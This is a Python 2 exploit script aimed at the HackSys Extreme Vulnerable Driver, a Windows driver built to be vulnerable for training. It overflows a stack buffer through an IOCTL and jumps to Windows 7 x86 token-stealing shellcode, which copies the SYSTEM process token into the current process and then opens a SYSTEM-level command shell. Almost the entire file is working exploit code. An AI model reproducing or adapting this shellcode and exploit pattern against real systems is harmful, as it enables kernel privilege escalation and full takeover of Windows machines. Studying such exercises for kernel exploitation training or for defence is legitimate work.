import os 
import sys
import struct
from ctypes import *
from ctypes.wintypes import *

kernel32 = windll.kernel32

def TokenStealingPayloadWin7():
	shellcode = (
		#---[Setup]
		"\x60"                      # pushad
		"\x64\xA1\x24\x01\x00\x00" 	# mov eax, fs:[KTHREAD_OFFSET]
		"\x8B\x40\x50"              # mov eax, [eax + EPROCESS_OFFSET]
		"\x89\xC1"                  # mov ecx, eax (Current _EPROCESS structure)
		"\x8B\x98\xF8\x00\x00\x00" 	# mov ebx, [eax + TOKEN_OFFSET]
		#---[Copy System PID token]
		"\xBA\x04\x00\x00\x00"      # mov edx, 4 (SYSTEM PID)
		"\x8B\x80\xB8\x00\x00\x00"  # mov eax, [eax + FLINK_OFFSET] <-|
		"\x2D\xB8\x00\x00\x00"      # sub eax, FLINK_OFFSET           |
		"\x39\x90\xB4\x00\x00\x00"  # cmp [eax + PID_OFFSET], edx     |
		"\x75\xED"                  # jnz                           ->|
		"\x8B\x90\xF8\x00\x00\x00"  # mov edx, [eax + TOKEN_OFFSET]
		"\x89\x91\xF8\x00\x00\x00"  # mov [ecx + TOKEN_OFFSET], edx
		#---[Recover]
		"\x61"                      # popad
		"\x31\xC0"                  # NTSTATUS -> STATUS_SUCCESS
		"\x5D"                      # pop ebp
		"\xC2\x08\x00"              # ret 8
	)
	
	shellcodePtr = id(shellcode) + 20
	return shellcodePtr
	
def main():
	lpBytesReturned = c_ulong()
	hDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000,0, None, 0x3, 0, None)
	if not hDevice or hDevice == -1:
		print "[!] Failed to get a handle to the driver " + str(ctypes.GetLastError())
		return -1
	
	buf = "\x41" * 2080 + struct.pack("<L",TokenStealingPayloadWin7())
	bufSize  = len(buf)
	bufPtr = id(buf) + 20

	print "[+] Sending IOCTL request "
	kernel32.DeviceIoControl(hDevice, 0x222003, bufPtr, bufSize, None, 0,byref(lpBytesReturned)   , None)
	
	os.system('cmd.exe')

		
if __name__ == '__main__':
	main()
# EOF
